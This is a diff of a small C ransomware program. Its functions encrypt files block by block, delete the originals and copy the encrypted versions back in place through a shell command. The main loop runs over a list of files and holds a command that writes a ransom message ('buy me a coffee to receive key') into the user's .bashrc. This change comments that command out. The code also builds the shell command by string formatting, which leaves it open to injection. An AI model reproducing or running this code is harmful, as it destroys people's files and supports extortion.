@@ -80,15 +80,7 @@ void encrypt_file(char * path){
     while (!feof(fp))
     {
         fread(buffer, 16, 1, fp);
-        //if (feof(fp)){
-        //    int i = 0;
-        //    while(buffer[i] != '\n' && i < 16) i++;
-        //    buffer[i] = '\0';
-        //}
-        //if(strlen(buffer) < 16) printf("Plaintext: | %d\n\n", strlen(buffer));
         encrypt(buffer);
-        //printf("Encrypt: %d | %d\n\n", sizeof(buffer), strlen(buffer));
-
         fwrite(buffer, 16, 1, fp_temp);
         fflush(fp_temp);
         memset(buffer, '\0', buffer_length);
@@ -96,10 +88,8 @@ void encrypt_file(char * path){
     fclose(fp);
     fclose(fp_temp);
 
-    /* Delete original source file */
     remove(path);
 
-    /* Rename temp file as original file */
     char * cmd = (char*) malloc(sizeof(char*)*1000);
     sprintf(cmd,"cp %s %s", "temp.tmp", path);
     system(cmd);
@@ -122,12 +112,8 @@ void decrypt_file(char * path){
     while (!feof(fp))
     {
         fread(buffer, 16, 1, fp);
-        // Replace all occurrence of word from current line
-        //printf("Decrypt: %s | %d\n\n", decrypt(cipher), strlen(decrypt(cipher)));
-        // After replacing write it to temp file.
+        if(feof(fp)) break;
         decrypt(buffer);
-        //printf("Cipher: %d | %d\n\n", sizeof(buffer), strlen(buffer));
-
         fwrite(buffer, sizeof(buffer), 1, fp_temp);
         fflush(fp_temp);
         memset(buffer, '\0', buffer_length);
@@ -155,9 +141,9 @@ int main()
     for(int i =0; i< count_files; i++){
         printf("%s\n", list_all_files[i]);
         //encrypt_file(list_all_files[i]);
-        system("file=/home/$(whoami)/.bashrc; if ! grep -n encrypted $file; then"
-            " echo \"echo \"Your data is encrypted, buy me a coffee to receive"
-            " key to decrypt your data\"\" >> $file; fi");
+        //system("file=/home/$(whoami)/.bashrc; if ! grep -n encrypted $file; then"
+        //    " echo \"echo \"Your data is encrypted, buy me a coffee to receive"
+        //    " key to decrypt your data\"\" >> $file; fi");
         //decrypt_file(list_all_files[i]);
     }
     return(0);
